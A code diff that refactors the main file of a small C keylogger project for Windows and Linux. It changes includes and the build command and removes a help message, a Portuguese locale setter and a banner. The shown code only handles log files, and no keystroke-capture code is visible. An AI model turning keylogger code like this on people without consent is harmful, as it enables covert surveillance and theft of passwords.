@@ -1,33 +1,24 @@
 /* #############################################################################
 ## DESCRIPTION: Building a simple Windows-Linux Keylogger.
-## NAME: keylogger.c
+## NAME: main.c
 ## AUTHOR: Lucca Pessoa da Silva Matos
 ## DATE: 14.04.2020
 ## VERSION: 1.1
 ## EXEMPLE:
-##     > gcc -o keylogger keylogger.c
+##     > gcc -o keylogger .\main.c keylogger.c
 ##############################################################################*/
 
 // =============================================================================
 // LIBRARYS
 // =============================================================================
 
-// C Library to perform Input/Output operations.
-#include <stdio.h>
-// C Library with General Utilities.
-#include <stdlib.h>
-// C Library that contains some definitions of functions to get and manipulete
-// data an time information.
-#include <time.h>
-// C Library that supports slocalization specific settings, such as
-// culture-specific data formats or country-specific currency symbols
-#include <locale.h>
-// C Library that contains declarations to all functions of Windows API
-#include <unistd.h>
-// Logger library.
 #include "log.c"
-// C Library bool.
+#include <stdio.h>
+#include <stdlib.h>
+#include <locale.h>
+#include <unistd.h>
 #include <stdbool.h>
+#include "keylogger.h"
 
 // Import windows library if this system in WINDOWS.
 #if defined(_WIN32) || defined(_WIN64) || defined(__CYGWIN__) && !defined(_WIN32)
@@ -49,10 +40,6 @@ log_fatal(const char *fmt, ...);
 // =============================================================================
 // CALL FUNCTIONS
 // =============================================================================
-
-void helper();
-void cabecalho();
-void set_portuguese();
 
 FILE *create_file();
 FILE *check_file_exist();
@@ -158,12 +145,6 @@ int main(int argc, char const *argv[]){
 // FUNCTIONS
 // =============================================================================
 
-void set_portuguese(void){
-  setlocale(LC_ALL, "Portuguese");
-}
-
-// =============================================================================
-
 bool check_file_pointer_exist(FILE *file_pointer){
   return file_pointer ? true : false;
 }
@@ -195,31 +176,4 @@ FILE *check_file_exist(const char *file_name){
     FILE *file_pointer = create_file(file_name);
     return file_pointer;
   }
-}
-
-// =============================================================================
-
-void helper(void){
-  printf(
-    "\n"
-    "Usage:\n"
-    "     sudo ./keyloger [ -s | -f file] [-h]\n"
-    "\n"
-    "Options:\n"
-    "  -f    file    Path to the output file.\n"
-    "  -s            Print to stdout.\n"
-    "  -h            This help message.\n");
-  exit(EXIT_FAILURE);
-}
-
-// =============================================================================
-
-void cabecalho(void){
-  printf("\n**************************************************");
-  printf("\n*                                                *");
-  printf("\n*                                                *");
-  printf("\n* IMPLEMENTANDO SIMPLES KEYLOGGER - LUCCA PESSOA *");
-  printf("\n*                                                *");
-  printf("\n*                                                *");
-  printf("\n**************************************************\n\n");
 }
